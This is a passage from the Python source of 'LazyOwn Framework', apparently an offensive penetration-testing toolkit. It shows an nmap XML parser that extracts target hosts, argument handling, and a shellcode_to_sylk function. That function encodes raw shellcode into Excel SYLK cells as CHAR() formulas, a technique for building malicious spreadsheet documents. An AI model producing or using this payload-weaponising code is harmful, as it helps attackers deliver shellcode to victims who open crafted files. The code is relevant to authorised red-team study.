        print(f"[!] The XML file '{xml_file}' does not exist.")
        return None

    with open(xml_file, 'r') as file:
        xml_content = file.read()

    ip_match = re.search(r'<address addr="([\d\.]+)"', xml_content)

    domain_match = re.search(r'<hostname name="([\w\.-]+)"', xml_content)

    if domain_match:
        domain = domain_match.group(1)
    elif ip_match:
        domain = ip_match.group(1)

    if domain:
        print(f"[+] Domain/IP found in XML: {domain} [👽]")
    else:
        print("[!] No domain or IP found in the XML file. [👽]")

    return domain

def shellcode_to_sylk(shellcode_path):
    
	sylk_output = SYLK_TEMPLATE

	charinline = 0
	cell = 1

	with open(shellcode_path, "rb") as f:
		byte = f.read(1)
		while byte != b"":
			if charinline == 0:
				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
				cell += 1
			else:
				sylk_output+=("&")
			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
			byte = f.read(1)
			charinline += 1
			if charinline == 20:
				sylk_output += ("\n")
				charinline = 0
	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
	return sylk_output

signal.signal(signal.SIGINT, signal_handler)
arguments = sys.argv[1:]  


for arg in arguments:
    if arg == "--help":
        halp()

    elif arg == "-v":
        print_msg(f"LazyOwn Framework: {version}")
        sys.exit(0)
    elif arg == "-h":
        halp()
    elif arg == "--no-banner":
        NOBANNER = True

    elif arg == "-s":
        RUN_AS_ROOT = True

    elif arg.startswith("-c"):
        print_msg(f"Exec: option {arg}")
        break
    elif arg.startswith("-p"):
        print_msg(f"Load Payload: option {arg}")
        break
    elif arg.startswith("--old-banner"):
        BANNER = OLD_BANNER
        break
      
    else:
        print_error(f"Error: Wrong argument: {arg}")
        sys.exit(2)

if RUN_AS_ROOT:
    check_sudo()


if __name__ == "__main__":
    print_error("This script is not for execute apart from LazyOwn Framework")
    